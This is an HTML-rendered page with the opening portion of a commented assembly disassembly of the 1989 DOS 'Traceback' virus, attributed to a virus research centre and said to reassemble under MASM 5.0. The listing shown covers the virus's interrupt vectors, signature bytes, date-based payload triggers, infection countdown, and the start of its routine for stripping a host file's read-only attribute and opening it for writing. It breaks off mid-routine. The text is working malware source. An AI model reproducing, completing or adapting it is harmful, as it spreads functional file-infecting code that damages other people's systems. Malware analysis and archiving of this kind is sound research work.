<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.TraceBack.3066 - TRACEBCK.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">    </span><span class="sc9">page</span><span class="sc0">    </span><span class="sc2">65</span><span class="sc4">,</span><span class="sc2">132</span><span class="sc0">
    </span><span class="sc9">title</span><span class="sc0">   </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc12">'Traceback'</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">
</span><span class="sc1">; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป</span><span class="sc0">
</span><span class="sc1">; บ                 British Computer Virus Research Centre                   บ</span><span class="sc0">
</span><span class="sc1">; บ  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    บ</span><span class="sc0">
</span><span class="sc1">; บ  Telephone:     Domestic   0273-26105,   International  +44-273-26105    บ</span><span class="sc0">
</span><span class="sc1">; บ                                                                          บ</span><span class="sc0">
</span><span class="sc1">; บ                          The 'Traceback' Virus                           บ</span><span class="sc0">
</span><span class="sc1">; บ                Disassembled by Joe Hirst,      June  1989                บ</span><span class="sc0">
</span><span class="sc1">; บ                                                                          บ</span><span class="sc0">
</span><span class="sc1">; บ                      Copyright (c) Joe Hirst 1989.                       บ</span><span class="sc0">
</span><span class="sc1">; บ                                                                          บ</span><span class="sc0">
</span><span class="sc1">; บ      This listing is only to be made available to virus researchers      บ</span><span class="sc0">
</span><span class="sc1">; บ                or software writers on a need-to-know basis.              บ</span><span class="sc0">
</span><span class="sc1">; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ</span><span class="sc0">

    </span><span class="sc1">; The disassembly has been tested by re-assembly using MASM 5.0.</span><span class="sc0">

</span><span class="sc5">BOOT</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc9">AT</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">24H</span><span class="sc0">
</span><span class="sc5">BW0024</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Int 9 offset</span><span class="sc0">
</span><span class="sc5">BW0026</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Int 9 segment</span><span class="sc0">

    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">70H</span><span class="sc0">
</span><span class="sc5">BW0070</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Int 1CH offset</span><span class="sc0">
</span><span class="sc5">BW0072</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Int 1CH segment</span><span class="sc0">

    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">80H</span><span class="sc0">
</span><span class="sc5">BD0080</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">BW0080</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Int 20H offset</span><span class="sc0">
</span><span class="sc5">BW0082</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Int 20H segment</span><span class="sc0">
</span><span class="sc5">BW0084</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Int 21H offset</span><span class="sc0">
</span><span class="sc5">BW0086</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Int 21H segment</span><span class="sc0">

    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">90H</span><span class="sc0">
</span><span class="sc5">BW0090</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Int 24H offset</span><span class="sc0">
</span><span class="sc5">BW0092</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Int 24H segment</span><span class="sc0">

    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">9CH</span><span class="sc0">
</span><span class="sc5">BD009C</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">BW009C</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Int 27H offset</span><span class="sc0">
</span><span class="sc5">BW009E</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Int 27H segment</span><span class="sc0">

    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">449H</span><span class="sc0">
</span><span class="sc5">BB0449</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Current VDU mode</span><span class="sc0">

</span><span class="sc5">BOOT</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">CODE</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">

</span><span class="sc5">DW0000</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">02EEBH</span><span class="sc0">          </span><span class="sc1">; \ Stored start of host program</span><span class="sc0">
</span><span class="sc5">DB0002</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">090H</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
</span><span class="sc5">DB0003</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0FFH</span><span class="sc0">
</span><span class="sc5">DB0004</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0FBH</span><span class="sc0">            </span><span class="sc1">; Infection countdown</span><span class="sc0">
</span><span class="sc5">DD0005</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">DW0005</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">100H</span><span class="sc0">
</span><span class="sc5">DW0007</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0CBBH</span><span class="sc0">
</span><span class="sc5">DW0009</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">4DH</span><span class="sc0">
</span><span class="sc5">DB000B</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">DB000D</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0EBH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6CH</span><span class="sc0">
</span><span class="sc5">DB0014</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'o - Copyright S &amp; S E'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">29</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">CURDIR</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'PLIC'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">; Current directory</span><span class="sc0">
</span><span class="sc5">DTAFLE</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'????????COM '</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'c:\m '</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">1AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AFH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">95H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'COMMAND.COM'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">DTADIR</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'???????????'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">20H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B5H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'CAT-TWO.ARC'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">DB00DF</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SEGREG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0AEBH</span><span class="sc0">
</span><span class="sc5">PTHDSK</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; Pathname drive</span><span class="sc0">
</span><span class="sc5">CURDSK</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; Current disk</span><span class="sc0">
</span><span class="sc5">ATTR_F</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0020H</span><span class="sc0">           </span><span class="sc1">; File attributes</span><span class="sc0">
</span><span class="sc5">TIME_F</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">22B6H</span><span class="sc0">           </span><span class="sc1">; File time</span><span class="sc0">
</span><span class="sc5">DATE_F</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">1174H</span><span class="sc0">           </span><span class="sc1">; File date</span><span class="sc0">
</span><span class="sc5">I24_OF</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">04EBH</span><span class="sc0">           </span><span class="sc1">; Old Int 24H offset</span><span class="sc0">
</span><span class="sc5">I24_SG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0A17H</span><span class="sc0">           </span><span class="sc1">; Old Int 24H segment</span><span class="sc0">
</span><span class="sc5">CRTERR</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Critical error flag</span><span class="sc0">
</span><span class="sc5">F_HAND</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; File handle</span><span class="sc0">
</span><span class="sc5">F_TIME</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">5951H</span><span class="sc0">           </span><span class="sc1">; File time</span><span class="sc0">
</span><span class="sc5">F_DATE</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0F8BH</span><span class="sc0">           </span><span class="sc1">; File date</span><span class="sc0">
</span><span class="sc5">F_ATTR</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0020H</span><span class="sc0">           </span><span class="sc1">; File attributes</span><span class="sc0">
</span><span class="sc5">V_SIGN</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">056H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">047H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">031H</span><span class="sc0">    </span><span class="sc1">; Virus signature</span><span class="sc0">

    </span><span class="sc1">; Entry point</span><span class="sc0">

</span><span class="sc5">BP0010</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">BP0020</span><span class="sc0">

    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">SIGNAT</span><span class="sc0">

</span><span class="sc5">BP0020</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0640</span><span class="sc0">          </span><span class="sc1">; Get relocation constant in SI</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0600</span><span class="sc0">          </span><span class="sc1">; Set Int 24H vector</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">19H</span><span class="sc0">          </span><span class="sc1">; Get current disk function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">PTH_OF</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">SI</span><span class="sc0">        </span><span class="sc1">; \ Address of pathname</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">PTH_OF</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DB0884</span><span class="sc0"> </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">PTH_SG</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">       </span><span class="sc1">; Segment of pathname</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">CURDSK</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">       </span><span class="sc1">; Save current disk</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0510</span><span class="sc0">          </span><span class="sc1">; Get installed virus segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc5">PTHDSK</span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get pathname drive in installed virus</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc0">           </span><span class="sc1">; Get segment in installed virus</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP0030</span><span class="sc0">          </span><span class="sc1">; Branch if not installed</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">PTH_OF</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DB0884</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0"> </span><span class="sc1">; Pathname in installed virus</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">PTH_SG</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Segment in installed virus</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">0FFH</span><span class="sc0">         </span><span class="sc1">; Is there a pathname drive?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0030</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0EH</span><span class="sc0">          </span><span class="sc1">; Select disk function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
</span><span class="sc5">BP0030</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">SWTCHB</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">80H</span><span class="sc0"> </span><span class="sc1">; Set on switch eight</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">F_HAND</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Clear file handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2AH</span><span class="sc0">          </span><span class="sc1">; Get date function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">07C4H</span><span class="sc0">        </span><span class="sc1">; Is year 1988?</span><span class="sc0">
    </span><span class="sc6">JGE</span><span class="sc0"> </span><span class="sc5">BP0040</span><span class="sc0">          </span><span class="sc1">; Branch if not before</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">BP0070</span><span class="sc0">

</span><span class="sc5">PTH_OF</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0F8CH</span><span class="sc0">           </span><span class="sc1">; Offset of pathname</span><span class="sc0">
</span><span class="sc5">PTH_SG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0AEBH</span><span class="sc0">           </span><span class="sc1">; Segment of pathname</span><span class="sc0">
</span><span class="sc5">ISWTCH</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Infected file switch</span><span class="sc0">

    </span><span class="sc1">; 1988 or later</span><span class="sc0">

</span><span class="sc5">BP0040</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JG</span><span class="sc0">  </span><span class="sc5">BP0050</span><span class="sc0">          </span><span class="sc1">; Branch if after 1988</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc2">0CH</span><span class="sc0">          </span><span class="sc1">; Is month December?</span><span class="sc0">
    </span><span class="sc6">JL</span><span class="sc0">  </span><span class="sc5">BP0070</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">            </span><span class="sc1">; 5th of December?</span><span class="sc0">
    </span><span class="sc6">JL</span><span class="sc0">  </span><span class="sc5">BP0070</span><span class="sc0">          </span><span class="sc1">; Branch if before</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">1CH</span><span class="sc0">          </span><span class="sc1">; 28th of December?</span><span class="sc0">
    </span><span class="sc6">JL</span><span class="sc0">  </span><span class="sc5">BP0060</span><span class="sc0">          </span><span class="sc1">; Branch if before</span><span class="sc0">
</span><span class="sc5">BP0050</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DSPCNT</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0FFDCH</span><span class="sc0">   </span><span class="sc1">; Start display count (60 mins)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">SWTCHB</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">88H</span><span class="sc0"> </span><span class="sc1">; Switches four &amp; eight</span><span class="sc0">
</span><span class="sc5">BP0060</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">DB0004</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0F8H</span><span class="sc0">     </span><span class="sc1">; Has infection count reached target?</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">BP0080</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
</span><span class="sc5">BP0070</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">CRTERR</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Clear critical error flag</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0270</span><span class="sc0">

    </span><span class="sc1">; Unreachable code</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">DB0004</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0F8H</span><span class="sc0">     </span><span class="sc1">; Has infection count reached target?</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">BP0080</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">SWTCHB</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">   </span><span class="sc1">; Set on switch three</span><span class="sc0">

</span><span class="sc5">BP0080</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DB00DF</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Set not-first-time switch off</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">PTH_OF</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get pathname offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc5">PTH_SG</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get pathname segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4300H</span><span class="sc0">        </span><span class="sc1">; Get attributes function</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0230</span><span class="sc0">          </span><span class="sc1">; Perform a DOS service</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0090</span><span class="sc0">          </span><span class="sc1">; Branch if error</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">F_ATTR</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Save file attributes</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">0FEH</span><span class="sc0">         </span><span class="sc1">; Switch off read-only</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301H</span><span class="sc0">        </span><span class="sc1">; Set attributes function</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0230</span><span class="sc0">          </span><span class="sc1">; Perform a DOS service</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0090</span><span class="sc0">          </span><span class="sc1">; Branch if error</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3D02H</span><span class="sc0">        </span><span class="sc1">; Open handle R/W function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0090</span><span class="sc0">          </span><span class="sc1">; Branch if error</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
